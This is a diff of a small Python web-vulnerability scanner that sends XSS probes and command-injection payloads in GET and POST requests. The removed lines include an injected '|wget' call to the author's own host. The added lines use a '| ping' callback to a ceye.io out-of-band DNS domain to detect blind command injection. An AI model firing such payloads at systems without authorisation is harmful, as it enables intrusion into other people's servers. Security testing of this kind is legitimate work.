@@ -4,7 +4,7 @@ Created on 2018��4��18��
 
 @author: guimaizi
 '''
-import json,re,requests
+import json,re,requests,random,string
 
 class test_vul:
     def __init__(self,payload):
@@ -62,7 +62,7 @@ class test_vul:
             kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
             r = requests.post(url,data,headers=kv)
             if 'xssguimaizi' in r.text:
-                print('#xss:%s---%s'%(url,data))
+                print('\n####xss:%s---%s\n'%(url,data))
                 #print(r.text)
         except:
             pass
@@ -71,15 +71,15 @@ class test_vul:
             kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
             r = requests.get(url,headers=kv)
             if 'xssguimaizi' in r.text:
-                print('#xss:'+url)
+                print('\n###xss:'+url+'\n')
         except:
             pass
             #print(r.text)
-    def cmd_injection(self,cmd):
-        print(cmd)
-        
 if '__main__' == __name__:
-    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
-    for i in payload:
-        item=test_vul(i)
-    #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')
+    #xss测试
+    xss_payload='<\'\"xssguimaizi>'
+    item=test_vul(xss_payload)
+    #命令注入测试
+    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 7))
+    cmd_payload='1a | ping %s.pp5vac.ceye.io'%ran_str
+    item=test_vul(cmd_payload)
